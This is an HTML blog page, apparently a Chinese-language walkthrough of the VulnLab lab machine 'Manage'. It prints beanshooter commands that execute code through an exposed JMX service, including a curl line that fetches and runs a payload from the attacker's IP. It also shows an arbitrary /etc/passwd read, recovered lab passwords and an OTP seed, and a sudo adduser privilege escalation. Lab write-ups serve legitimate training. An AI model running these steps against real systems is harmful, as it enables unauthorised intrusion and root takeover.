@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;94e81119-b035-4a92-a058-b139783699e3 首先，通過 rmg 工具對 jmxrmi 進行枚舉，發現系統中僅有 jmxrmi 開啟。接著，使用 beanshooter 工具針對 jmx 協議進行操作，成功枚舉到兩個用戶，但 SSH 登錄失敗，因為該系統僅支持使用 SSH 密鑰登錄。為">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Manage">
+<meta property="og:url" content="https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;94e81119-b035-4a92-a058-b139783699e3 首先，通過 rmg 工具對 jmxrmi 進行枚舉，發現系統中僅有 jmxrmi 開啟。接著，使用 beanshooter 工具針對 jmx 協議進行操作，成功枚舉到兩個用戶，但 SSH 登錄失敗，因為該系統僅支持使用 SSH 密鑰登錄。為">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051557-c6hl6fk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102034909-oxf44za.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102042904-cwkyqx3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102042947-7dgjn7b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103003650-6jdqd8d.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044523-s2l2v9r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044742-d29v8op.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103003742-04y67v0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102043723-mj1y8v3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044906-92xy2xk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044942-t4ug0jw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045333-2aiwmbu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045403-i9opkzp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045637-c7v5sqy.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045544-24x9vu9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045706-e8c38ie.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103004450-qjj1kfk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103004502-o6gvs2h.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102050121-jgipmit.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051231-nb8zsp4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051302-zk9mulm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051504-c9pk5jo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051410-qm888bt.png">
+<meta property="article:published_time" content="2025-01-02T19:51:00.000Z">
+<meta property="article:modified_time" content="2025-01-02T19:52:29.345Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051557-c6hl6fk.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Manage</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/03/2025/09-vulnlab-retro/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/03/2025/07-vulnlab-lock/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&text=VulnLab - Machine - Manage"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&is_video=false&description=VulnLab - Machine - Manage"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Manage&body=Check out this article: https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&name=VulnLab - Machine - Manage&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&t=VulnLab - Machine - Manage"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Manage
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-02T19:51:00.000Z" class="dt-published" itemprop="datePublished">2025-01-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051557-c6hl6fk.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=94e81119-b035-4a92-a058-b139783699e3">https://api.vulnlab.com/api/v1/share?id=94e81119-b035-4a92-a058-b139783699e3</a></p>
+<p>首先，通過 rmg 工具對 jmxrmi 進行枚舉，發現系統中僅有 jmxrmi 開啟。接著，使用 beanshooter 工具針對 jmx 協議進行操作，成功枚舉到兩個用戶，但 SSH 登錄失敗，因為該系統僅支持使用 SSH 密鑰登錄。為了進一步測試，查閱文檔後發現 stand 功能可以執行任意命令，於是嘗試執行命令並成功上傳了一個 shell。隨後，利用 diagnostic read 功能讀取了系統中的任意文件，並連接到 C2 伺服器，查看 &#x2F;etc&#x2F;passwd 文件，發現一個名為 useradmin 的用戶。根據之前的枚舉結果，嘗試使用已知的密碼之一進行登錄，成功後卻遇到需要驗證碼的問題。為了獲取驗證碼，使用 linpeas 工具檢查系統，發現 &#x2F;home&#x2F;useradmin 目錄下有一個 backups 文件夾，其中的 backup.tar.gz 文件具有讀取權限。解壓後，發現了 .google_authenticator 文件，裡面包含了一個 OTP 生成密鑰。通過在線工具生成 OTP，成功獲得驗證碼並登錄系統。進一步檢查 sudo 權限後，發現可以使用 root 身份來增加用戶。由於系統是 Ubuntu，根據默認的 sudoers 文件，admin 組的用戶可以使用 sudo 獲得 root 權限。利用這一漏洞，創建一個名為 admin 的用戶，隨後切換到該用戶並使用 sudo -s 命令獲得 root 權限，最終成功獲取了系統的完全控制權限。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE    REASON         VERSION</span><br><span class="line">22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=</span><br><span class="line">|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh</span><br><span class="line">2222/tcp  open  java-rmi   syn-ack ttl 63 Java RMI</span><br><span class="line">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rmi-dumpregistry: </span><br><span class="line">|   jmxrmi</span><br><span class="line">|     javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">|     @127.0.1.1:41069</span><br><span class="line">|     extends</span><br><span class="line">|       java.rmi.server.RemoteStub</span><br><span class="line">|       extends</span><br><span class="line">|_        java.rmi.server.RemoteObject</span><br><span class="line">8080/tcp  open  http       syn-ack ttl 63 Apache Tomcat 10.1.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/10.1.19</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">36373/tcp open  tcpwrapped syn-ack ttl 63</span><br><span class="line">41069/tcp open  java-rmi   syn-ack ttl 63 Java RMI</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>2222端口看到有開啓 <code>jmxrmi</code>​。</p>
+<h1 id="Recon-with-Port-2222"><a href="#Recon-with-Port-2222" class="headerlink" title="Recon with Port 2222"></a>Recon with Port 2222</h1><p>使用 <a target="_blank" rel="noopener" href="https://github.com/qtc-de/remote-method-guesser">rmg </a>枚舉一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar rmg-5.1.0-jar-with-dependencies.jar enum 10.10.103.181 2222</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102034909-oxf44za.png" alt="image">​</p>
+<p>也可以看到只有 <code>jmxrmi</code>​ 開啓了。</p>
+<h2 id="Use-beanshooter’s-enum-mode-to-get-the-passwords"><a href="#Use-beanshooter’s-enum-mode-to-get-the-passwords" class="headerlink" title="Use beanshooter’s enum mode to get the passwords"></a>Use beanshooter’s enum mode to get the passwords</h2><p>那就使用 <a target="_blank" rel="noopener" href="https://github.com/qtc-de/beanshooter">beanshooter </a>工具針對<code>jmx</code>​這個協議做點事情，首先根據 github 的描述，使用  <code>enum</code>​ 可以枚舉一些用戶，所以嘗試試一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.103.181 2222</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102042904-cwkyqx3.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+]     - Listing 2 tomcat <span class="built_in">users</span>:</span><br><span class="line">[+]</span><br><span class="line">[+]             ----------------------------------------</span><br><span class="line">[+]             Username:  manager</span><br><span class="line">[+]             Password:  fhErvo2r9wuTEYiYgt</span><br><span class="line">[+]             Roles:</span><br><span class="line">[+]                        Users:<span class="built_in">type</span>=Role,rolename=<span class="string">&quot;manage-gui&quot;</span>,database=UserDatabase</span><br><span class="line">[+]</span><br><span class="line">[+]             ----------------------------------------</span><br><span class="line">[+]             Username:  admin</span><br><span class="line">[+]             Password:  onyRPCkaG4iX72BrRtKgbszd</span><br><span class="line">[+]             Roles:</span><br><span class="line">[+]                        Users:<span class="built_in">type</span>=Role,rolename=<span class="string">&quot;role1&quot;</span>,database=UserDatabase</span><br></pre></td></tr></table></figure>
+
+<p>結果還真的得到了兩個用戶，如果使用 ssh 則會提示登陸失敗，因爲ssh只能用 ssh key 來登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102042947-7dgjn7b.png" alt="image">​</p>
+<h2 id="Use-beanshooter’s-stand-mode-to-execute-some-command"><a href="#Use-beanshooter’s-stand-mode-to-execute-some-command" class="headerlink" title="Use beanshooter’s stand mode to execute some command"></a>Use beanshooter’s stand mode to execute some command</h2><p>所以看一下能不能遠程執行一些命令，翻了翻文檔看到 <code>stand</code>​ 的功能可以執行任意命令：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103003650-6jdqd8d.png" alt="image">​</p>
+<p>所以嘗試一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar  stand 10.10.103.181 2222 <span class="built_in">exec</span> <span class="string">&#x27;curl 10.8.4.212/test&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044523-s2l2v9r.png" alt="image">​</p>
+<p>結果真的執行了，那就上傳一個 shell ： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar  stand 10.10.103.181 2222 <span class="built_in">exec</span> <span class="string">&#x27;curl 10.8.4.212/mane -o /tmp/mane&#x27;</span></span><br><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar  stand 10.10.103.181 2222 <span class="built_in">exec</span> <span class="string">&#x27;chmod 777 /tmp/mane&#x27;</span></span><br><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar  stand 10.10.103.181 2222 <span class="built_in">exec</span> <span class="string">&#x27;/tmp/mane&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>等待一段時間后就上綫了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044742-d29v8op.png" alt="image">​</p>
+<h2 id="Use-beanshooter’s-read-mode-can-read-any-password"><a href="#Use-beanshooter’s-read-mode-can-read-any-password" class="headerlink" title="Use beanshooter’s read mode can read any password"></a>Use beanshooter’s read mode can read any password</h2><p>另外發現 <code>diagnostic read</code>​ 可以讀取任意文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103003742-04y67v0.png" alt="image">​</p>
+<p>嘗試了一下還真的可以：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar   diagnostic <span class="built_in">read</span>  10.10.103.181 2222   /etc/passwd </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102043723-mj1y8v3.png" alt="image">​</p>
+<h1 id="Find-the-backup-file-on-useradmin’s-home"><a href="#Find-the-backup-file-on-useradmin’s-home" class="headerlink" title="Find the backup file on useradmin’s home"></a>Find the backup file on useradmin’s home</h1><p>連上 C2， 查看 <code>/etc/passwd</code>​，看到有一個 useradmin，由於一開始枚舉的時候發現有兩個賬號密碼</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044906-92xy2xk.png" alt="image">​</p>
+<p>嘗試猜一下那些密碼，發現其中的 <code>onyRPCkaG4iX72BrRtKgbszd</code>​ 是 <code>useradmin</code>​ 的密碼，所以嘗試切換用戶看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su useradmin : onyRPCkaG4iX72BrRtKgbszd</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102044942-t4ug0jw.png" alt="image">​</p>
+<p>需要 <code>Verification code</code>​ 由於不知道是什麽，所以嘗試跑一下linpeas，發現 <code>/home/useradmin</code>​ 下面有東西：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045333-2aiwmbu.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045403-i9opkzp.png" alt="image">​</p>
+<p>所以進去看了一下，只有 <code>backups</code>​ 的文件夾裏面的 <code>backup.tar.gz</code>​ 有讀取的權限：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045637-c7v5sqy.png" alt="image">​</p>
+<p>嘗試解壓看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045544-24x9vu9.png" alt="image">​</p>
+<h1 id="Get-OTP-password-and-login-with-useradmin"><a href="#Get-OTP-password-and-login-with-useradmin" class="headerlink" title="Get OTP password and login with useradmin"></a>Get OTP password and login with useradmin</h1><p>看到 <code>./.google_authenticator</code>​ 文件，打開一看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102045706-e8c38ie.png" alt="image">​</p>
+<p>其中 <code>CLSSSMHYGLENX5HAIFBQ6L35UM</code>​ 應該是OTP生成的密匙，搜索了一下也看到了<a target="_blank" rel="noopener" href="https://linux.how2shout.com/how-to-use-google-two-factor-authentication-with-ubuntu-22-04/">如何配置谷歌的OTP</a>，</p>
+<p>可以使用一些在綫的工具生成 OTP，比如：<a target="_blank" rel="noopener" href="https://totp.app/">https://totp.app/</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103004450-qjj1kfk.png" alt="image">​</p>
+<p>增加了一下之後得到了 code ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250103004502-o6gvs2h.png" alt="image">​</p>
+<p>嘗試登錄看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102050121-jgipmit.png" alt="image">​</p>
+<p>結果成功了，另外使用 <code>sudo -l</code>​ 看了一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$</span><br></pre></td></tr></table></figure>
+
+<h2 id="Add-admin-user-to-got-root"><a href="#Add-admin-user-to-got-root" class="headerlink" title="Add admin user to got root"></a>Add admin user to got root</h2><p>可以使用 root 的身份去增加一個用戶，<code>/usr/sbin/adduser</code>​ 後面可以只允許有大小寫英文 + 數字，這就説明不允許指定一些參數。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051231-nb8zsp4.png" alt="image">​</p>
+<p>看起來是 ubuntu 系統，在ubuntu的<a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/Sudoers">默認 sudoers文件</a>中有一行</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051302-zk9mulm.png" alt="image">​</p>
+<p>也就是說默認的 admin 組允許 sudo 去 root， 但是 <code>adduser</code>​ 會自動給user創建同名的組，所以可以利用這個漏洞，創建 admin 用戶即可創建 admin 組：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/sbin/adduser admin</span><br></pre></td></tr></table></figure>
+
